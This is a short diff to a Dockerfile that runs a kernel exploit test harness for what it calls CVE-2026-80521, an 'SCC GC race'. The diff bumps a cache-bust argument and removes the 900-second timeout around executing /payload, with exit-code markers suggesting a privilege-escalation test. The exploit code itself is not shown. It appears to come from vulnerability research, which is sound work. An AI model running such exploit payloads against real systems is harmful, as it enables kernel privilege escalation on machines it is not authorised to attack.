@@ -8,7 +8,7 @@ RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
 
-ARG CACHEBUST=1581
+ARG CACHEBUST=1582
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
@@ -61,7 +61,7 @@ case "$KVER" in \
     echo "=== KERNEL CONFIG PROBE END ==="; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
     echo "PAYLOAD START" >&2; \
-    timeout 900 /payload 2>&1; \
+    /payload 2>&1; \
     EC=$?; \
     echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
     echo "PAYLOAD EXIT=$EC" >&2; \
